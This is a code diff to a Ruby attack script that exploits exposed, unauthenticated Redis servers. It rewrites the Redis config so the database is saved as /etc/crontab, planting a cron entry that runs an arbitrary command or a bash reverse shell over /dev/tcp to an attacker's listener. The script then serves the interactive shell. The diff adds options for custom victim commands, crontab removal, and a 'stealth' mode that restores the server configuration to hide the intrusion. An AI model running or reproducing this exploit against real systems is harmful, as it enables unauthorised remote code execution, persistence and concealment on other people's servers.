@@ -21,7 +21,7 @@ EOF
 
 #Reference: https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html
 
-@opts = {port: "6379", timeout: "1", sshport: "22"}
+@opts = {port: "6379", timeout: "1", user: "root"}
 OptionParser.new do |parser|
 	parser.banner = "Usage: ./redis_ssh.rb [options]"
 
@@ -37,10 +37,9 @@ OptionParser.new do |parser|
 	parser.on("-t", "--timeout TIME", "Time to wait for packets (default: 1)") do |t|
 		@opts[:timeout] = t
 	end
-	parser.on("-s","--lhost LHOST" ,"Address to listen on") do |lhost|
-		@opts[:lhost] = lhost
+	parser.on("-s","--lhost LHOST" ,"Address to listen on") do |s|
+		@opts[:lhost] = s
 	end
-
 	parser.on("-l","--lport LPORT", /\d*/, "Port to listen on") do |lport|
 		@opts[:lport] = lport
 	end
@@ -50,6 +49,17 @@ OptionParser.new do |parser|
 	parser.on("-e", "--stealth", "Restore configuration to stay hidden") do |e|
 		@opts[:stealth] = e
 	end
+	parser.on("-c", "--command COMMAND", "Command to run on victim (instead of default revshell)") do |c|
+		@opts[:command] = c
+	end
+	parser.on("-r", "--remove", "Remove a previously placed crontab") do |r|
+		@opts[:remove] = r
+	end
+=begin
+	parser.on("-u", "--user", "Place a crontab for a different user than root") do |u|
+		@opts[:user] = u
+	end
+=end
 	parser.on(nil, "--help", "Print this help") do
         puts parser
         exit
@@ -58,7 +68,7 @@ end.parse!
 
 for arg in [:host,:lhost,:lport]
 	if !@opts[arg]
-		abort "Missing #{arg}! (--help for usage)"
+		abort "Missing #{arg}! (--help for usage)" if (arg == :lhost or arg == :lport) && !@opts[:command] && !@opts[:remove] && !@opts[:info]
 	end
 end
 
@@ -98,11 +108,37 @@ class Log
 
 end
 
+def stealth
+	if !@opts[:stealth]
+		Log.warn "Not using -e flag, so not cleaning up"
+	else
+		if @conf_dir
+			Log.info "Restoring configuration directory"
+			out = send "config set dir #{@conf_dir}"
+			Log.res out if @opts[:verbose]
+			Log.warn "Failed to change config directory back" if out != "+OK\r\n"
+		end
+
+		if @conf_dbfilename
+			Log.info "Restoring databasefile"
+			out = send "config set dbfilename #{@conf_dbfilename}"
+			Log.res out if @opts[:verbose]
+			Log.warn "Failed to restore config database filename" if out != "+OK\r\n"
+		end
+
+		Log.warn "crontab might still placed at /etc/crontab or be in memory, use '-r' to remove" if !@opts[:remove]
+	end
+end
+
 #For exit and log oneliners
 def error
 	yield
 	if @changedConfigDir or @changedConfigFile
-		Log.warn "Permanent changes to the servers configuration have been made, these will have to be undone to stay hidden"
+		if @opts[:stealth]
+			stealth
+		else
+			Log.warn "Permanent changes to the servers configuration have been made, these will have to be undone to stay hidden"
+		end
 	end
 	exit 1
 end
@@ -167,8 +203,7 @@ Log.warn "Unable to read config dir" if !out.start_with?("*2\r\n$3\r\ndir\r\n")
 Log.info "Config directory: #{@conf_dir}"
 
 # When doing a vuln check dont go further
-Log.info "Exiting early"
-exit 0 if @opts[:info]
+begin Log.info "Exiting early"; exit 0 end if @opts[:info]
 
 if @opts[:stealth]
 	# Config directory retrieval
@@ -181,13 +216,14 @@ if @opts[:stealth]
 end
 
 Log.info "Setting configuration directory"
-out = send "config set dir /var/spool/cron"
+#out = send "config set dir /var/spool/cron"
+out = send "config set dir /etc"
 Log.res out if @opts[:verbose]
-error {Log.err "Failed to change config directory to /var/spool/cron (might not exist)"} if out != "+OK\r\n"
+error {Log.err "Failed to change config directory to /etc (might not exist)"} if out != "+OK\r\n"
 @changedConfigDir = true
 
-#name = (0...8).map { (65 + rand(26)).chr }.join
-new_dbname = "root"
+#new_dbname = @opts[:user]
+new_dbname = "crontab"
 
 Log.info "Changing database filename to '#{new_dbname}'"
 out = send "config set dbfilename #{new_dbname}"
@@ -200,59 +236,44 @@ out = send "flushall"
 Log.res out if @opts[:verbose]
 Log.warn "Failed to flush the database" if out != "+OK\r\n"
 
-command = "bash -i >& /dev/tcp/#{@opts[:lhost]}/#{@opts[:lport]} 0>&1"
+command = @opts[:command] || "bash -i >& /dev/tcp/#{@opts[:lhost]}/#{@opts[:lport]} 0>&1"
 payload = "* * * * * #{command}"
 
-# Saving pkey value
-Log.info "Saving value"
-escaped_string = "*3\r\n\$3\r\nset\r\n\$7\r\ncrontab\r\n\$#{payload.length + 4}\r\n#{"\n\n" + payload + "\n\n"}\r\n"
-out = send escaped_string
-Log.res out if @opts[:verbose]
-error {Log.err "Failed to save value on the server"} if out != "+OK\r\n"
+if !@opts[:remove]
+	Log.info "Saving value"
+	escaped_string = "*3\r\n\$3\r\nset\r\n\$7\r\ncrontab\r\n\$#{payload.length + 4}\r\n#{"\n\n" + payload + "\n\n"}\r\n"
+	out = send escaped_string
+	Log.res out if @opts[:verbose]
+	error {Log.err "Failed to save value on the server"} if out != "+OK\r\n"
+end
 
 Log.info "Saving database"
 out = send "save"
 Log.res out if @opts[:verbose]
 error {Log.err "Failed to save database"} if out != "+OK\r\n"
 
-if !@opts[:stealth]
-	Log.warn "Not using -e flag, so not cleaning up"
-else
-	if @conf_dir
-		Log.info "Restoring configuration directory"
-		out = send "config set dir #{@conf_dir}"
-		Log.res out if @opts[:verbose]
-		Log.warn "Failed to change config directory back" if out != "+OK\r\n"
-	end
+stealth
 
-	if @conf_dbfilename
-		Log.info "Restoring databasefile"
-		out = send "config set dbfilename #{@conf_dbfilename}"
-		Log.res out if @opts[:verbose]
-		Log.warn "Failed to restore config database filename" if out != "+OK\r\n"
-	end
-end
+if !@opts[:command] && !@opts[:remove]
+	Log.info "Opening revshell server on #{@opts[:lport]}"
+	# Connect-back @server
+	server = TCPServer.new @opts[:lport]
 
-Log.info "Opening revshell server on #{@opts[:lport]}"
-# Connect-back @server
-@server = TCPServer.new @opts[:lport]
+	Log.info "Waiting for connect-back (at least 60s)"
+	shell = server.accept
 
-Log.info "Waiting for connect-back (at least 60s)"
-shell = @server.accept
+	Log.succ "Succesfull connect-back"
 
-Log.succ "Succesfull connect-back"
+	Log.info "Starting (fully upgradeable) shell"
 
-Log.info "Starting (fully upgradeable) shell"
-
-loop do
-	begin
-		print shell.read_nonblock(1)
-	rescue
-	end
-	begin
-		shell.write STDIN.read_nonblock(1)
-	rescue
+	loop do
+		begin
+			print shell.read_nonblock(1)
+		rescue
+		end
+		begin
+			shell.write STDIN.read_nonblock(1)
+		rescue
+		end
 	end
 end
-
-# Auto remove?
